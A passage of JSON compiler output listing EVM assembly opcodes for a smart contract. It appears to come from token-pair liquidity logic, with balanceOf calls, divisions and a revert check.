											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "238"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 8321,
											"end": 8361,
											"name": "POP"
										},
										{
											"begin": 8321,
											"end": 8361,
											"name": "GAS"
										},
										{
											"begin": 8321,
											"end": 8361,
											"name": "STATICCALL"
										},
										{
											"begin": 8321,
											"end": 8361,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "239"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1"
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY"
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "239"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 8321,
											"end": 8361,
											"name": "POP"
										},
										{
											"begin": 8321,
											"end": 8361,
											"name": "POP"
										},
										{
											"begin": 8321,
											"end": 8361,
											"name": "POP"
										},
										{
											"begin": 8321,
											"end": 8361,
											"name": "POP"
										},
										{
											"begin": 8321,
											"end": 8361,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 8321,
											"end": 8361,
											"name": "MLOAD"
										},
										{
											"begin": 8321,
											"end": 8361,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "240"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "240"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 8321,
											"end": 8361,
											"name": "MLOAD"
										},
										{
											"begin": 8387,
											"end": 8427,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 8387,
											"end": 8427,
											"name": "DUP1"
										},
										{
											"begin": 8387,
											"end": 8427,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 8387,
											"end": 8427,
											"name": "DUP2"
										},
										{
											"begin": 8387,
											"end": 8427,
											"name": "MSTORE"
										},
										{
											"begin": 8421,
											"end": 8425,
											"name": "ADDRESS"
										},
										{
											"begin": 8387,
											"end": 8427,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 8387,
											"end": 8427,
											"name": "DUP3"
										},
										{
											"begin": 8387,
											"end": 8427,
											"name": "ADD"
										},
										{
											"begin": 8387,
											"end": 8427,
											"name": "MSTORE"
										},
										{
											"begin": 8387,
											"end": 8427,
											"name": "SWAP1"
										},
										{
											"begin": 8387,
											"end": 8427,
											"name": "MLOAD"
										},
										{
											"begin": 8321,
											"end": 8361,
											"name": "SWAP2"
										},
										{
											"begin": 8321,
											"end": 8361,
											"name": "SWAP3"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 8371,
											"end": 8384,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 8371,
											"end": 8384,
											"name": "SWAP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 8387,
											"end": 8412,
											"name": "DUP6"
										},
										{
											"begin": 8387,
											"end": 8412,
											"name": "AND"
										},
										{
											"begin": 8387,
											"end": 8412,
											"name": "SWAP2"
										},
										{
											"begin": 8387,
											"end": 8412,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": 8387,
											"end": 8412,
											"name": "SWAP2"
										},
										{
											"begin": 8387,
											"end": 8427,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 8387,
											"end": 8427,
											"name": "DUP1"
										},
										{
											"begin": 8387,
											"end": 8427,
											"name": "DUP4"
										},
										{
											"begin": 8387,
											"end": 8427,
											"name": "ADD"
										},
										{
											"begin": 8387,
											"end": 8427,
											"name": "SWAP3"
										},
										{
											"begin": 8321,
											"end": 8361,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8321,
											"end": 8361,
											"name": "SWAP3"
										},
										{
											"begin": 8387,
											"end": 8427,
											"name": "SWAP2"
										},
										{
											"begin": 8387,
											"end": 8427,
											"name": "SWAP1"
										},
										{
											"begin": 8387,
											"end": 8427,
											"name": "DUP3"
										},
										{
											"begin": 8387,
											"end": 8427,
											"name": "SWAP1"
										},
										{
											"begin": 8387,
											"end": 8427,
											"name": "SUB"
										},
										{
											"begin": 8387,
											"end": 8427,
											"name": "ADD"
										},
										{
											"begin": 8387,
											"end": 8427,
											"name": "DUP2"
										},
										{
											"begin": 8387,
											"end": 8412,
											"name": "DUP7"
										},
										{
											"begin": 8387,
											"end": 8427,
											"name": "DUP1"
										},
										{
											"begin": 8387,
											"end": 8427,
											"name": "EXTCODESIZE"
										},
										{
											"begin": 8387,
											"end": 8427,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "241"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "241"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 8387,
											"end": 8427,
											"name": "POP"
										},
										{
											"begin": 8387,
											"end": 8427,
											"name": "GAS"
										},
										{
											"begin": 8387,
											"end": 8427,
											"name": "STATICCALL"
										},
										{
											"begin": 8387,
											"end": 8427,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "242"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1"
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY"
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "242"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 8387,
											"end": 8427,
											"name": "POP"
										},
										{
											"begin": 8387,
											"end": 8427,
											"name": "POP"
										},
										{
											"begin": 8387,
											"end": 8427,
											"name": "POP"
										},
										{
											"begin": 8387,
											"end": 8427,
											"name": "POP"
										},
										{
											"begin": 8387,
											"end": 8427,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 8387,
											"end": 8427,
											"name": "MLOAD"
										},
										{
											"begin": 8387,
											"end": 8427,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "243"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "243"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 8387,
											"end": 8427,
											"name": "MLOAD"
										},
										{
											"begin": 8472,
											"end": 8476,
											"name": "ADDRESS"
										},
										{
											"begin": 8437,
											"end": 8451,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 8454,
											"end": 8478,
											"name": "SWAP1"
										},
										{
											"begin": 8454,
											"end": 8478,
											"name": "DUP2"
										},
										{
											"begin": 8454,
											"end": 8478,
											"name": "MSTORE"
										},
										{
											"begin": 8454,
											"end": 8463,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 8387,
											"end": 8427,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8454,
											"end": 8478,
											"name": "MSTORE"
										},
										{
											"begin": 8454,
											"end": 8478,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 8454,
											"end": 8478,
											"name": "DUP2"
										},
										{
											"begin": 8454,
											"end": 8478,
											"name": "KECCAK256"
										},
										{
											"begin": 8454,
											"end": 8478,
											"name": "SLOAD"
										},
										{
											"begin": 8387,
											"end": 8427,
											"name": "SWAP2"
										},
										{
											"begin": 8387,
											"end": 8427,
											"name": "SWAP3"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 8502,
											"end": 8532,
											"name": "PUSH [tag]",
											"value": "244"
										},
										{
											"begin": 8511,
											"end": 8520,
											"name": "DUP9"
										},
										{
											"begin": 8522,
											"end": 8531,
											"name": "DUP9"
										},
										{
											"begin": 8502,
											"end": 8510,
											"name": "PUSH [tag]",
											"value": "214"
										},
										{
											"begin": 8502,
											"end": 8532,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 8502,
											"end": 8532,
											"name": "tag",
											"value": "244"
										},
										{
											"begin": 8502,
											"end": 8532,
											"name": "JUMPDEST"
										},
										{
											"begin": 8542,
											"end": 8559,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 8562,
											"end": 8573,
											"name": "SLOAD"
										},
										{
											"begin": 8489,
											"end": 8532,
											"name": "SWAP1"
										},
										{
											"begin": 8489,
											"end": 8532,
											"name": "SWAP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 8562,
											"end": 8573,
											"name": "DUP1"
										},
										{
											"begin": 8671,
											"end": 8694,
											"name": "PUSH [tag]",
											"value": "245"
										},
										{
											"begin": 8671,
											"end": 8680,
											"name": "DUP5"
										},
										{
											"begin": 8685,
											"end": 8693,
											"name": "DUP8"
										},
										{
											"begin": 8671,
											"end": 8694,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 8671,
											"end": 8684,
											"name": "PUSH [tag]",
											"value": "175"
										},
										{
											"begin": 8671,
											"end": 8694,
											"name": "AND"
										},
										{
											"begin": 8671,
											"end": 8694,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 8671,
											"end": 8694,
											"name": "tag",
											"value": "245"
										},
										{
											"begin": 8671,
											"end": 8694,
											"name": "JUMPDEST"
										},
										{
											"begin": 8671,
											"end": 8709,
											"name": "DUP2"
										},
										{
											"begin": 8671,
											"end": 8709,
											"name": "PUSH [tag]",
											"value": "246"
										},
										{
											"begin": 8671,
											"end": 8709,
											"name": "JUMPI"
										},
										{
											"begin": 8671,
											"end": 8709,
											"name": "INVALID"
										},
										{
											"begin": 8671,
											"end": 8709,
											"name": "tag",
											"value": "246"
										},
										{
											"begin": 8671,
											"end": 8709,
											"name": "JUMPDEST"
										},
										{
											"begin": 8671,
											"end": 8709,
											"name": "DIV"
										},
										{
											"begin": 8671,
											"end": 8709,
											"name": "SWAP11"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 8803,
											"end": 8815,
											"name": "DUP1"
										},
										{
											"begin": 8777,
											"end": 8800,
											"name": "PUSH [tag]",
											"value": "247"
										},
										{
											"begin": 8777,
											"end": 8786,
											"name": "DUP5"
										},
										{
											"begin": 8791,
											"end": 8799,
											"name": "DUP7"
										},
										{
											"begin": 8777,
											"end": 8800,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 8777,
											"end": 8790,
											"name": "PUSH [tag]",
											"value": "175"
										},
										{
											"begin": 8777,
											"end": 8800,
											"name": "AND"
										},
										{
											"begin": 8777,
											"end": 8800,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 8777,
											"end": 8800,
											"name": "tag",
											"value": "247"
										},
										{
											"begin": 8777,
											"end": 8800,
											"name": "JUMPDEST"
										},
										{
											"begin": 8777,
											"end": 8815,
											"name": "DUP2"
										},
										{
											"begin": 8777,
											"end": 8815,
											"name": "PUSH [tag]",
											"value": "248"
										},
										{
											"begin": 8777,
											"end": 8815,
											"name": "JUMPI"
										},
										{
											"begin": 8777,
											"end": 8815,
											"name": "INVALID"
										},
										{
											"begin": 8777,
											"end": 8815,
											"name": "tag",
											"value": "248"
										},
										{
											"begin": 8777,
											"end": 8815,
											"name": "JUMPDEST"
										},
										{
											"begin": 8777,
											"end": 8815,
											"name": "DIV"
										},
										{
											"begin": 8767,
											"end": 8815,
											"name": "SWAP10"
										},
										{
											"begin": 8767,
											"end": 8815,
											"name": "POP"
										},
										{
											"begin": 8904,
											"end": 8905,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 8894,
											"end": 8901,
											"name": "DUP12"
										},
										{
											"begin": 8894,
											"end": 8905,
											"name": "GT"
										},
										{
											"begin": 8894,
											"end": 8920,
											"name": "DUP1"
										},
										{
											"begin": 8894,
											"end": 8920,
											"name": "ISZERO"
										},
										{
											"begin": 8894,
											"end": 8920,
											"name": "PUSH [tag]",
											"value": "249"
										},
										{
											"begin": 8894,
											"end": 8920,
											"name": "JUMPI"
										},
										{
											"begin": 8894,
											"end": 8920,
											"name": "POP"
										},
										{
											"begin": 8919,
											"end": 8920,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 8909,
											"end": 8916,
											"name": "DUP11"
										},
										{
											"begin": 8909,
											"end": 8920,
											"name": "GT"
										},
										{
											"begin": 8894,
											"end": 8920,
											"name": "tag",
											"value": "249"
										},
										{
											"begin": 8894,
											"end": 8920,
											"name": "JUMPDEST"
										},
										{
											"begin": 8873,
											"end": 8984,
											"name": "PUSH [tag]",
											"value": "250"
										},
										{
											"begin": 8873,
											"end": 8984,
											"name": "JUMPI"
										},
										{
											"begin": 8873,
											"end": 8984,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 8873,
											"end": 8984,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 8873,
											"end": 8984,
											"name": "DUP2"
										},
										{
											"begin": 8873,
											"end": 8984,
											"name": "MSTORE"
										},
										{
											"begin": 8873,
											"end": 8984,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 8873,
											"end": 8984,
											"name": "ADD"
										},
										{
											"begin": 8873,
											"end": 8984,
											"name": "DUP1"
										},
										{
											"begin": 8873,
											"end": 8984,
											"name": "DUP1"
										},
										{
											"begin": 8873,
											"end": 8984,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8873,
											"end": 8984,
											"name": "ADD"
										},
										{
											"begin": 8873,
											"end": 8984,
											"name": "DUP3"
										},
										{
											"begin": 8873,
											"end": 8984,
											"name": "DUP2"
										},
										{
											"begin": 8873,
											"end": 8984,
											"name": "SUB"
										},
										{
											"begin": 8873,
											"end": 8984,
											"name": "DUP3"
										},
										{
											"begin": 8873,
											"end": 8984,
											"name": "MSTORE"
										},
										{
											"begin": 8873,
											"end": 8984,
											"name": "PUSH",
											"value": "26"
										},
										{
											"begin": 8873,
											"end": 8984,
											"name": "DUP2"
										},
										{
											"begin": 8873,
											"end": 8984,
											"name": "MSTORE"
										},
										{
											"begin": 8873,
											"end": 8984,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8873,
											"end": 8984,
											"name": "ADD"
										},
										{
											"begin": 8873,
											"end": 8984,
											"name": "DUP1"
										},
										{
											"begin": 8873,
											"end": 8984,
											"name": "PUSH data",
											"value": "6C050B0A8D3F2D18D11271EE0A551B7748437B8FA9A6165C561190D34A2947D6"
										},
										{
											"begin": 8873,
											"end": 8984,
											"name": "PUSH",
											"value": "26"
										},
										{
											"begin": 8873,
											"end": 8984,
											"name": "SWAP2"
										},
										{
											"begin": 8873,
											"end": 8984,
											"name": "CODECOPY"
										},
										{
											"begin": 8873,
											"end": 8984,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 8873,
											"end": 8984,
											"name": "ADD"
										},
										{
											"begin": 8873,
											"end": 8984,
											"name": "SWAP2"
										},
										{
											"begin": 8873,
											"end": 8984,
											"name": "POP"
										},
										{
											"begin": 8873,
											"end": 8984,
											"name": "POP"
										},
										{
											"begin": 8873,
											"end": 8984,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 8873,
											"end": 8984,
											"name": "MLOAD"
										},
										{
											"begin": 8873,
											"end": 8984,
											"name": "DUP1"
										},
										{
											"begin": 8873,
											"end": 8984,
											"name": "SWAP2"
										},
										{
											"begin": 8873,
											"end": 8984,
											"name": "SUB"
										},
										{
											"begin": 8873,
											"end": 8984,
											"name": "SWAP1"
										},
										{
											"begin": 8873,
											"end": 8984,
											"name": "REVERT"
										},
										{
											"begin": 8873,
											"end": 8984,
											"name": "tag",
											"value": "250"
										},
										{
											"begin": 8873,
											"end": 8984,
											"name": "JUMPDEST"
										},
										{
											"begin": 8994,
											"end": 9025,
											"name": "PUSH [tag]",
											"value": "251"
										},
										{
											"begin": 9008,
											"end": 9012,
											"name": "ADDRESS"
										},
										{
											"begin": 9015,
											"end": 9024,
											"name": "DUP5"
										},
										{
											"begin": 8994,
											"end": 8999,
											"name": "PUSH [tag]",
											"value": "252"
										},
										{
											"begin": 8994,
											"end": 9025,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 8994,
											"end": 9025,
											"name": "tag",
											"value": "251"
										},
										{
											"begin": 8994,
											"end": 9025,
											"name": "JUMPDEST"
										},
										{
											"begin": 9035,
											"end": 9070,
											"name": "PUSH [tag]",
											"value": "253"
										},
										{
											"begin": 9049,
											"end": 9056,
											"name": "DUP8"
										},
										{
											"begin": 9058,
											"end": 9060,
											"name": "DUP14"
										},
										{
											"begin": 9062,
											"end": 9069,
											"name": "DUP14"
										},
										{
											"begin": 9035,
											"end": 9048,
											"name": "PUSH [tag]",
											"value": "149"
										},
										{
											"begin": 9035,
											"end": 9070,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 9035,
											"end": 9070,
											"name": "tag",
											"value": "253"
										},
										{
											"begin": 9035,
											"end": 9070,
											"name": "JUMPDEST"
										},
										{
											"begin": 9080,
											"end": 9115,
											"name": "PUSH [tag]",
											"value": "254"
										},
										{
											"begin": 9094,
											"end": 9101,
											"name": "DUP7"
										},
										{
											"begin": 9103,
											"end": 9105,
											"name": "DUP14"
										},
										{
											"begin": 9107,
											"end": 9114,
											"name": "DUP13"
										},
										{
											"begin": 9080,
											"end": 9093,
											"name": "PUSH [tag]",
											"value": "149"
										},
										{
											"begin": 9080,
											"end": 9115,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 9080,
											"end": 9115,
											"name": "tag",
											"value": "254"
										},
										{
											"begin": 9080,
											"end": 9115,
											"name": "JUMPDEST"
										},
										{
											"begin": 9136,
											"end": 9176,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 9136,
											"end": 9176,
											"name": "DUP1"
										},
										{
											"begin": 9136,
											"end": 9176,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 9136,
											"end": 9176,
											"name": "DUP2"
										},
										{
											"begin": 9136,
											"end": 9176,
											"name": "MSTORE"
										},
										{
											"begin": 9170,
											"end": 9174,
											"name": "ADDRESS"
										},
										{
											"begin": 9136,
											"end": 9176,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 9136,
											"end": 9176,
											"name": "DUP3"
										},
										{
											"begin": 9136,
											"end": 9176,
											"name": "ADD"
										},
										{
											"begin": 9136,
											"end": 9176,
											"name": "MSTORE"
										},
										{
											"begin": 9136,
											"end": 9176,
											"name": "SWAP1"
										},
										{
											"begin": 9136,
											"end": 9176,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 9136,
											"end": 9161,
											"name": "DUP10"
										},
										{
											"begin": 9136,
											"end": 9161,
											"name": "AND"
										},
										{
											"begin": 9136,
											"end": 9161,
											"name": "SWAP2"
										},
										{
											"begin": 9136,
											"end": 9161,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": 9136,
											"end": 9161,
											"name": "SWAP2"
										},
										{
											"begin": 9136,
											"end": 9176,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 9136,
											"end": 9176,
											"name": "DUP1"
										},
										{
											"begin": 9136,
											"end": 9176,
											"name": "DUP4"
										},
										{
											"begin": 9136,
											"end": 9176,
											"name": "ADD"
										},
										{
											"begin": 9136,
											"end": 9176,
											"name": "SWAP3"
										},
										{
											"begin": 9136,
											"end": 9176,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 9136,
											"end": 9176,
											"name": "SWAP3"
										},
										{
											"begin": 9136,
											"end": 9176,
											"name": "SWAP2"
										},
										{
											"begin": 9136,
											"end": 9176,
											"name": "SWAP1"
										},
										{
											"begin": 9136,
											"end": 9176,
											"name": "DUP3"
										},
										{
											"begin": 9136,
											"end": 9176,
											"name": "SWAP1"
										},
										{
											"begin": 9136,
											"end": 9176,
											"name": "SUB"
										},
										{
											"begin": 9136,
											"end": 9176,
											"name": "ADD"
										},
										{
											"begin": 9136,
											"end": 9176,
											"name": "DUP2"
										},
										{
											"begin": 9136,
											"end": 9161,
											"name": "DUP7"
										},
										{
											"begin": 9136,
											"end": 9176,
											"name": "DUP1"
										},
										{
											"begin": 9136,
											"end": 9176,
											"name": "EXTCODESIZE"
										},
										{
											"begin": 9136,
											"end": 9176,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "255"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "255"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 9136,
											"end": 9176,
											"name": "POP"
										},
										{
											"begin": 9136,
											"end": 9176,
											"name": "GAS"
										},
										{
											"begin": 9136,
											"end": 9176,
											"name": "STATICCALL"
										},
										{
											"begin": 9136,
											"end": 9176,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "256"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1"
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY"
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "256"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 9136,
											"end": 9176,
											"name": "POP"
										},
										{
											"begin": 9136,
											"end": 9176,
											"name": "POP"
										},
										{
											"begin": 9136,
											"end": 9176,
											"name": "POP"
										},
										{
											"begin": 9136,
											"end": 9176,
											"name": "POP"
										},
										{
											"begin": 9136,
											"end": 9176,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 9136,
											"end": 9176,
											"name": "MLOAD"
										},
										{
											"begin": 9136,
											"end": 9176,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "257"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "257"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 9136,
											"end": 9176,
											"name": "MLOAD"
										},
										{
											"begin": 9197,
											"end": 9237,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 9197,
											"end": 9237,
											"name": "DUP1"
										},
										{
											"begin": 9197,
											"end": 9237,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 9197,
											"end": 9237,
											"name": "DUP2"
										},
										{
											"begin": 9197,
											"end": 9237,
											"name": "MSTORE"
										},
										{
											"begin": 9231,
											"end": 9235,
											"name": "ADDRESS"
										},
										{
											"begin": 9197,
											"end": 9237,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 9197,
											"end": 9237,
											"name": "DUP3"
										},
										{
											"begin": 9197,
											"end": 9237,
											"name": "ADD"
										},
										{
											"begin": 9197,
											"end": 9237,
											"name": "MSTORE"
										},
										{
											"begin": 9197,
											"end": 9237,
											"name": "SWAP1"
										},
										{
											"begin": 9197,
											"end": 9237,
											"name": "MLOAD"
										},
										{
											"begin": 9136,
											"end": 9176,
											"name": "SWAP2"
										},
										{
											"begin": 9136,
											"end": 9176,
											"name": "SWAP7"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
